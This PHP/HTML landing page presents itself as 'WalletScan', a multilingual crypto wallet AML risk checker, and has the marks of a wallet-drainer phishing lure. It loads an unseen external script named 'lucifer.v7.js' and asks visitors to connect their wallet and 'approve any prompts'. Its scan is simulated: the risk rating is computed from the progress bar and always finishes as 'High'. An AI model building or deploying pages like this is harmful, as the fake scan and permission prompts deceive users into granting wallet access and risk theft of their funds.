<?php
// Simple landing that uses only HTML+PHP+JS (CSS inline). All visible text defaults to English; ES/RU available via selector.
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Wallet Risk Checker</title>
  <meta name="description" content="Wallet AML risk checker for Ethereum, BSC, Arbitrum, Polygon, Base, Fantom and Avalanche." />
  <style>
    :root{ --bg:#0b1020; --card:#0f162f; --text:#e9edf8; --muted:#a7b0c3; --primary:#1463ff; --primary-600:#0f4ed1; --danger:#ff3b3b; --accent:#00e0ff; --success:#18c37e; --gauge-track:rgba(255,255,255,.12);} *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans","Apple Color Emoji","Segoe UI Emoji";background:radial-gradient(1200px 800px at 80% -10%,rgba(20,99,255,.25),transparent 60%),radial-gradient(900px 900px at -10% 110%,rgba(0,224,255,.18),transparent 60%),var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
    .app{min-height:100%;display:flex;align-items:center;justify-content:center;padding:20px}
    .phone-frame{width:min(420px,100%);background:linear-gradient(180deg,rgba(255,255,255,0.06),rgba(255,255,255,0.03));border:1px solid rgba(255,255,255,0.12);box-shadow:0 10px 40px rgba(0,0,0,0.45),inset 0 1px 0 rgba(255,255,255,0.06);border-radius:22px;overflow:clip;position:relative}
    header{display:flex;align-items:center;gap:10px;padding:14px 16px;backdrop-filter:blur(6px);background:linear-gradient(180deg,rgba(5,8,20,.7),rgba(5,8,20,.4));border-bottom:1px solid rgba(255,255,255,0.08)}
    .header-left{display:flex;align-items:center;gap:10px}
    .spacer{flex:1 1 auto}
    .logo{width:30px;height:30px;display:inline-flex;align-items:center;justify-content:center;border-radius:8px;overflow:hidden;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12)}
    .logo img{display:block;width:100%;height:100%;object-fit:contain}
    .brand{font-weight:800;letter-spacing:.2px}
    .lang{position:relative}
    .lang-btn{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);color:#e9edf8;border-radius:12px;padding:8px 10px;cursor:pointer;display:flex;align-items:center;gap:6px}
    .lang-btn .flag{font-size:16px;line-height:1}
    .lang-menu{position:absolute;right:0;top:42px;background:#0f162f;border:1px solid rgba(255,255,255,.14);border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.5);padding:6px;display:grid;gap:4px;min-width:160px;z-index:20}
    .lang-menu[hidden]{display:none}
    .lang-opt{background:transparent;border:0;color:#e9edf8;text-align:left;display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:10px;cursor:pointer}
    .lang-opt:hover{background:rgba(255,255,255,.06)}

    main{padding:22px 18px 24px;text-align:center}
    h1{font-size:clamp(28px,7vw,36px);line-height:1.1;margin:6px 0 10px;letter-spacing:.2px}
    .sub{color:var(--muted);font-size:14px;margin:10px auto 2px;max-width:34ch}
    .hero{position:relative;margin:10px auto 16px;padding:18px 12px 6px;border-radius:18px;background:linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02));border:1px solid rgba(255,255,255,0.1)}
    .gauge-wrap{position:relative;width:82%;max-width:320px;margin:6px auto 8px;aspect-ratio:1/1}
    .gauge{position:absolute;inset:0;display:grid;place-items:center} .gauge svg{width:100%;height:100%;overflow:visible} .gauge .center{position:absolute;display:grid;place-items:center;text-align:center}
    .bolt{color:var(--danger);font-size:18px} .percent{font-weight:800;font-size:clamp(34px,8vw,44px);letter-spacing:.5px} .risk-label{font-size:13px;color:var(--muted);margin-top:2px}
    .timeline{margin:12px auto 4px;width:88%;max-width:360px} .bar{position:relative;height:10px;border-radius:999px;background:rgba(255,255,255,.08);overflow:hidden}
    .bar::before{content:"";position:absolute;inset:0;width:30%;background:linear-gradient(90deg,transparent,rgba(20,99,255,.85),transparent);filter:blur(6px);animation:sweep 1.6s linear infinite}
    .bar .fill{position:absolute;top:0;left:0;height:100%;width:0%;background:linear-gradient(90deg,#18c37e,#00e0ff);box-shadow:0 0 16px rgba(0,224,255,.45);transition:width .3s ease}
    @keyframes sweep{from{left:-30%}to{left:100%}}
    .eta{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:var(--muted);margin-top:6px}
    .dot{width:6px;height:6px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent),0 0 20px rgba(0,224,255,.5);animation:pulse 1.2s ease-in-out infinite}
    @keyframes pulse{0%{transform:scale(.85);opacity:.75}50%{transform:scale(1.1);opacity:1}100%{transform:scale(.85);opacity:.75}}
    .lead{color:var(--muted);font-size:14px;margin:12px auto 16px;max-width:36ch}
    .cta{appearance:none;border:none;width:92%;max-width:380px;display:block;margin:12px auto 0;cursor:pointer;background:linear-gradient(180deg,var(--primary),var(--primary-600));color:#fff;font-weight:700;font-size:16px;padding:14px 18px;border-radius:16px;box-shadow:0 8px 20px rgba(20,99,255,.45),inset 0 1px 0 rgba(255,255,255,.25);transition:transform .08s ease,filter .2s ease,opacity .2s ease}
    .cta:active{transform:translateY(1px) scale(.99)} .cta[disabled]{opacity:.6;cursor:not-allowed}
    .status{font-size:13px;color:var(--muted);margin:10px auto 8px;min-height:18px}
    .nodes{position:absolute;inset:0;pointer-events:none;overflow:hidden;opacity:.55}
    .node{position:absolute;width:42px;height:42px;border-radius:14px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);backdrop-filter:blur(4px);animation:float 12s ease-in-out infinite}
    .node:nth-child(1){top:12%;left:8%;animation-duration:10s} .node:nth-child(2){top:18%;right:12%;animation-duration:13s} .node:nth-child(3){bottom:18%;left:16%;animation-duration:14s} .node:nth-child(4){bottom:12%;right:10%;animation-duration:11s}
    @keyframes float{0%{transform:translateY(0) translateX(0)}50%{transform:translateY(-6px) translateX(6px)}100%{transform:translateY(0) translateX(0)}}
    footer{padding:16px;text-align:center;color:var(--muted);font-size:12px}
    @media (max-width:340px){.lead{font-size:13px}.cta{font-size:15px}}
  </style>
</head>
<body>
  <div class="app">
    <div class="phone-frame">
      <header>
        <div class="header-left">
          <a class="logo" href="/" aria-label="Digital wallet icon" title="Digital wallet" data-alt-es="Icono billetera digital" data-alt-ru="Иконка цифрового кошелька">
            <!-- Replace src with downloaded Flaticon asset path if available -->
            <img src="assets/digital-wallet.svg" alt="Digital Wallet Icon" />
          </a>
          <div class="brand">WalletScan</div>
        </div>
        <div class="spacer"></div>
        <div class="lang">
          <button id="langBtn" class="lang-btn" aria-label="Change language" title="Language" data-alt-es="Cambiar idioma" data-alt-ru="Сменить язык">
            <span class="flag" id="currentFlag" aria-hidden="true">🇺🇸</span> EN
          </button>
          <div id="langMenu" class="lang-menu" hidden>
            <button class="lang-opt" data-lang="en"><span class="flag">🇺🇸</span> English</button>
            <button class="lang-opt" data-lang="es"><span class="flag">🇪🇸</span> Español</button>
            <button class="lang-opt" data-lang="ru"><span class="flag">🇷🇺</span> Русский</button>
          </div>
        </div>
      </header>
      <main>
        <div class="hero" role="region" aria-label="Wallet risk checker">
          <h1 id="titleText">Wallet Risk Checker</h1>

          <div class="gauge-wrap" aria-label="Risk score gauge" title="Risk score gauge"
               data-alt-es="Indicador de puntaje de riesgo" data-alt-ru="Индикатор оценки риска">
            <div class="gauge">
              <!-- SVG Circular Gauge -->
              <svg viewBox="0 0 120 120" aria-hidden="true" focusable="false">
                <!-- background arc -->
                <circle cx="60" cy="60" r="50" stroke="var(--gauge-track)" stroke-width="12" fill="none" stroke-linecap="round" />
                <!-- tick marks -->
                <g id="ticks" stroke="rgba(255,255,255,.16)">
                  <?php for($i=0;$i<21;$i++): $a = -120 + $i*12; ?>
                    <line x1="60" y1="8" x2="60" y2="14" stroke-width="2"
                          transform="rotate(<?= $a ?> 60 60)" />
                  <?php endfor; ?>
                </g>
                <!-- progress arc -->
                <circle id="arc" cx="60" cy="60" r="50" stroke="url(#grad)" stroke-width="12" fill="none" stroke-linecap="round"
                        transform="rotate(-120 60 60)" stroke-dasharray="314" stroke-dashoffset="314" />
                <defs>
                  <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0%" stop-color="#ff3b3b"/>
                    <stop offset="50%" stop-color="#f2c94c"/>
                    <stop offset="100%" stop-color="#18c37e"/>
                  </linearGradient>
                </defs>
              </svg>
              <div class="center">
                <div class="bolt" aria-hidden="true">⚡</div>
                <div class="percent"><span id="percent">0</span>%</div>
                <div id="riskLabel" class="risk-label">Ready</div>
              </div>
            </div>
          </div>

          <p class="sub" id="subText">Checks Ethereum, BSC, Arbitrum, Polygon, Base, Fantom, and Avalanche addresses for AML risk signals.</p>
          <div class="timeline" aria-hidden="false">
            <div class="bar">
              <div class="fill" id="barFill" style="width:0%"></div>
            </div>
            <div class="eta"><span class="dot"></span><span id="eta">Waiting…</span></div>
          </div>
        </div>

        <p class="lead" id="instruction"
           data-alt-es="Toque el botón para conectar su wallet y escanear direcciones. Por favor apruebe los avisos; a veces se requieren permisos para leer direcciones."
           data-alt-ru="Нажмите кнопку, чтобы подключить кошелек и сканировать адреса. Подтвердите запросы; могут потребоваться разрешения для чтения адресов.">
          Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.
        </p>

        <button id="connectBtn" class="cta">Connect Your Wallet</button>
        <div id="status" class="status" aria-live="polite"></div>
      </main>

      <div class="nodes" aria-hidden="true">
        <div class="node" style="animation-delay:0s"></div>
        <div class="node" style="animation-delay:.6s"></div>
        <div class="node" style="animation-delay:1.2s"></div>
        <div class="node" style="animation-delay:1.8s"></div>
      </div>

      <footer id="footerText">
        AMLTracker — All rights reserved. <span style="display:block;margin-top:4px;font-size:10px;opacity:.6">Icon by Triangle Squad - Flaticon</span>
      </footer>
    </div>
  </div>

  <script>
    // Gauge + i18n
    const arc = document.getElementById('arc');
    const percentEl = document.getElementById('percent');
    const riskLabel = document.getElementById('riskLabel');
    const barFill = document.getElementById('barFill');
    const etaEl = document.getElementById('eta');
    const connectBtn = document.getElementById('connectBtn');
    const statusEl = document.getElementById('status');
    const titleEl = document.getElementById('titleText');
    const subEl = document.getElementById('subText');
    const instructionEl = document.getElementById('instruction');
    const footerEl = document.getElementById('footerText');

    const langBtn = document.getElementById('langBtn');
    const langMenu = document.getElementById('langMenu');
    const currentFlag = document.getElementById('currentFlag');

    const CIRC = 2 * Math.PI * 50; // ~314

    let progress = 0;
    let running = false;
    let timer = null;
    let startedAt = 0;

    const i18n = {
      en: {
        flag: '🇺🇸', code:'EN',
        title: 'Wallet Risk Checker',
        sub: 'Checks Ethereum, BSC, Arbitrum, Polygon, Base, Fantom, and Avalanche addresses for AML risk signals.',
        instruction: 'Tap the button to connect your wallet and scan addresses. Please approve any prompts; permissions may be required to read addresses.',
        cta: 'Connect Your Wallet',
        footer: 'AMLTracker — All rights reserved.',
        ready: 'Ready', waiting: 'Waiting…', eta: s => `Estimated time: ${s}s`, finalizing: 'Finalizing…', initializing: 'Initializing…', cancelled: 'Cancelled.', network: 'Network error. Try again.', completed: v => `Completed • Risk: ${v}`,
        phase: (p)=> p<15?'Connecting to wallet…':p<30?'Reading address list…':p<45?'Fetching transaction history…':p<60?'Analyzing counterparties…':p<75?'Checking risk signals…':p<90?'Aggregating results…':p<100?'Final checks…':'Done.',
        riskVeryLow:'Very Low', riskLow:'Low', riskModerate:'Moderate', riskElevated:'Elevated', riskHigh:'High'
      },
      es: {
        flag: '🇪🇸', code:'ES',
        title: 'Comprobador de Riesgo de Wallet',
        sub: 'Revisa direcciones en Ethereum, BSC, Arbitrum, Polygon, Base, Fantom y Avalanche para señales de riesgo AML.',
        instruction: 'Toque el botón para conectar su wallet y escanear direcciones. Por favor apruebe los avisos; a veces se requieren permisos para leer direcciones.',
        cta: 'Conectar Wallet',
        footer: 'AMLTracker — Todos los derechos reservados.',
        ready: 'Listo', waiting: 'Esperando…', eta: s => `Tiempo estimado: ${s}s`, finalizing: 'Finalizando…', initializing: 'Inicializando…', cancelled: 'Cancelado.', network: 'Error de red. Intente de nuevo.', completed: v => `Completado • Riesgo: ${v}`,
        phase: (p)=> p<15?'Conectando a la wallet…':p<30?'Leyendo lista de direcciones…':p<45?'Obteniendo historial de transacciones…':p<60?'Analizando contrapartes…':p<75?'Comprobando señales de riesgo…':p<90?'Agregando resultados…':p<100?'Revisiones finales…':'Listo.',
        riskVeryLow:'Muy bajo', riskLow:'Bajo', riskModerate:'Moderado', riskElevated:'Elevado', riskHigh:'Alto'
      },
      ru: {
        flag: '🇷🇺', code:'RU',
        title: 'Проверка риска кошелька',
        sub: 'Проверяет адреса в Ethereum, BSC, Arbitrum, Polygon, Base, Fantom и Avalanche на AML‑риски.',
        instruction: 'Нажмите кнопку, чтобы подключить кошелёк и сканировать адреса. Подтвердите запросы; могут потребоваться разрешения для чтения адресов.',
        cta: 'Подключить кошелёк',
        footer: 'AMLTracker — Все права защищены.',
        ready: 'Готово', waiting: 'Ожидание…', eta: s => `Оставшееся время: ${s}с`, finalizing: 'Завершение…', initializing: 'Инициализация…', cancelled: 'Отменено.', network: 'Сетевая ошибка. Повторите попытку.', completed: v => `Завершено • Риск: ${v}`,
        phase: (p)=> p<15?'Подключение к кошельку…':p<30?'Чтение списка адресов…':p<45?'Загрузка истории транзакций…':p<60?'Анализ контрагентов…':p<75?'Проверка риск‑сигналов…':p<90?'Агрегация результатов…':p<100?'Финальные проверки…':'Готово.',
        riskVeryLow:'Очень низкий', riskLow:'Низкий', riskModerate:'Умеренный', riskElevated:'Повышенный', riskHigh:'Высокий'
      }
    };

    let currentLang = localStorage.getItem('lang') || 'en';

    function classify(p){
      const t = i18n[currentLang];
      if(p < 25) return t.riskVeryLow;
      if(p < 50) return t.riskLow;
      if(p < 70) return t.riskModerate;
      if(p < 85) return t.riskElevated;
      return t.riskHigh;
    }

    function applyLang(lang){
      currentLang = lang in i18n ? lang : 'en';
      localStorage.setItem('lang', currentLang);
      const t = i18n[currentLang];
      titleEl.textContent = t.title;
      subEl.textContent = t.sub;
      instructionEl.textContent = t.instruction;
      connectBtn.textContent = t.cta;
      footerEl.firstChild.textContent = t.footer;
      riskLabel.textContent = running ? classify(progress) : (progress === 0 ? t.ready : classify(progress));
      currentFlag.textContent = t.flag;
      langBtn.lastChild.textContent = ' ' + t.code; // update code on button
      // ETA/waiting label
      if(!running) etaEl.textContent = t.waiting;
    }

    function setProgress(p){
      progress = Math.max(0, Math.min(100, p|0));
      const dash = CIRC * (1 - progress/100);
      arc.setAttribute('stroke-dashoffset', dash.toFixed(1));
      percentEl.textContent = progress;
      barFill.style.width = progress + '%';
      riskLabel.textContent = running ? classify(progress) : (progress === 0 ? i18n[currentLang].ready : classify(progress));
    }

    function setETA(seconds){
      const t = i18n[currentLang];
      if(!running){ etaEl.textContent = t.waiting; return; }
      etaEl.textContent = seconds > 0 ? t.eta(seconds) : t.finalizing;
    }

    function cancelScan(msg){
      running = false; connectBtn.disabled = false; setETA(0);
      statusEl.textContent = msg || i18n[currentLang].cancelled;
      if(timer){ clearTimeout(timer); timer = null; }
    }

    async function startScan(){
      running = true; connectBtn.disabled = true; statusEl.textContent = i18n[currentLang].initializing;
      startedAt = Date.now();
      try{ await fetch('scan.php?reset=1', {cache:'no-store'}); }catch(e){}
      tick();
    }

    // Expose an interaction handler that only runs for the Connect button
    function interactBtn(e){
      const id = (e && (e.currentTarget?.id || e.target?.id)) || '';
      if(id !== 'connectBtn') return; // ignore any clicks not from the Connect button
      startScan();
    }
    window.interactBtn = interactBtn; // optional global, if other scripts expect it

    async function tick(){
      if(!running) return;
      try{
        const res = await fetch(`scan.php?current=${progress}`, {cache:'no-store'});
        const data = await res.json();
        setProgress(data.progress);
        // Prefer local phase message so it matches selected language
        statusEl.textContent = i18n[currentLang].phase(progress);
        const elapsed = (Date.now() - startedAt)/1000;
        const estTotal = 120; // keep in sync with server 2 minutes
        const remain = Math.max(0, Math.round(estTotal - elapsed));
        setETA(remain);
        if(progress >= 100){
          running = false; connectBtn.disabled = false; setETA(0);
          const verdict = classify(progress);
          statusEl.textContent = i18n[currentLang].completed(verdict);
        }else{
          timer = setTimeout(tick, data.delayMs || 1000);
        }
      }catch(err){
        cancelScan(i18n[currentLang].network);
      }
    }

    // Language menu handlers (do not propagate to global interaction handlers)
    langBtn.addEventListener('click', (e)=>{
      e.preventDefault();
      e.stopPropagation();
      if (e.stopImmediatePropagation) e.stopImmediatePropagation();
      langMenu.hidden = !langMenu.hidden;
    });
    document.addEventListener('click', ()=>{ langMenu.hidden = true; });
    langMenu.addEventListener('click', (e)=>{
      e.preventDefault();
      e.stopPropagation();
      if (e.stopImmediatePropagation) e.stopImmediatePropagation();
      const btn = e.target.closest('[data-lang]');
      if(!btn) return;
      applyLang(btn.dataset.lang);
      langMenu.hidden = true;
    });

    // Only the Connect button triggers the interaction
    connectBtn.addEventListener('click', interactBtn);

    // Initialize
    setProgress(0); setETA(0); applyLang(currentLang);
  </script>
</body>
</html>
